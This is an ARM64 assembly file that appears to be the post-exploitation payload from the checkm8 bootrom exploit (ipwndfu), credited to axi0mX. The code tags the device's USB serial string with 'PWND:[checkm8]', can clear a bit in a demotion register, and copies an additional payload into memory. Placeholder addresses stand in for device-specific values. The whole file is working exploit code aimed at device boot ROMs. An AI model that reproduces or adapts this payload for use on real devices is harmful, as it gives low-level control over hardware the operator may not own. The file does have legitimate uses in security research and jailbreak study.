// Code from the original checkm8 exploit by axi0mX
// https://github.com/axi0mX/ipwndfu
// This code has been relesed under the GPL v3

.text

.pool
.set PAYLOAD_OFFSET,               0xbad00008
.set PAYLOAD_SIZE,                 0xbad00009
.set PAYLOAD_DEST,                 0xbad00007
.set PAYLOAD_PTR,                  0xbad0000a
.set gUSBSerialNumber,             0xbad00002
.set gUSBSRNMStringDescriptor,     0xbad00004
.set gUSBDescriptors,              0xbad00001
.set usb_create_string_descriptor, 0xbad00003

.set demote_flag,                  0xbad00005
.set gDemotionRegister,            0xbad00006

.global _main
_main:
  mov   x19, #0                      // HACK: do not free this usb request
  stp   x29, x30, [sp,#-0x10]!
  mov   x29, sp

  // Do not set USB Descriptors anymore, this will cause a crash on t8011 (and maybe others)
  ldr   x0, =gUSBDescriptors    // dummy

  ldr   x0, =gUSBSerialNumber

_find_zero_loop:
  add   x0, x0, #1
  ldrb  w1, [x0]
  cbnz  w1, _find_zero_loop

  adr   x1, PWND_STRING
  ldp   x2, x3, [x1]
  stp   x2, x3, [x0]

  ldr   x0, =gUSBSerialNumber
  ldr   x1, =usb_create_string_descriptor
  blr   x1

  ldr   x1, =gUSBSRNMStringDescriptor
  strb  w0, [x1]

  ldr   x0, =demote_flag
  cmp   x0, #1
  bne   _copy_payload

_demotion:
  ldr   x1, =gDemotionRegister
  ldr   w0, [x1]
  tst   w0, #1
  beq   _end
  ldr   w0, [x1]
  and   w0, w0, #0xfffffffe
  str   w0, [x1]
  b     _end

_copy_payload:
  ldr   x0, =PAYLOAD_DEST
  adr   x1, _main
  ldr   x2, =PAYLOAD_OFFSET
  add   x1, x1, x2
  mov   x2, #0
  ldr   x3, =PAYLOAD_SIZE
  ldr   x4, =PAYLOAD_PTR
  add   x5, x0, #0x18
  str   x5, [x4]

_copy_loop:
  ldp   x3, x4,  [x1]
  stp   x3, x4,  [x0]
  ldp   x3, x4,  [x1,#0x10]
  stp   x3, x4,  [x0,#0x10]
  ldp   x3, x4,  [x1,#0x20]
  stp   x3, x4,  [x0,#0x20]
  ldp   x3, x4,  [x1,#0x30]
  stp   x3, x4,  [x0,#0x30]
  dc    civac, x0
  dmb   sy
  add   x0, x0, #0x40
  add   x1, x1, #0x40
  add   x2, x2, #0x40
  cmp   x2, x3
  b.cc  _copy_loop

_end:
  ic   iallu
  dsb   sy
  isb

  ldp   x29, x30, [sp], #0x10
  ret

PWND_STRING:
.asciz " PWND:[checkm8]"
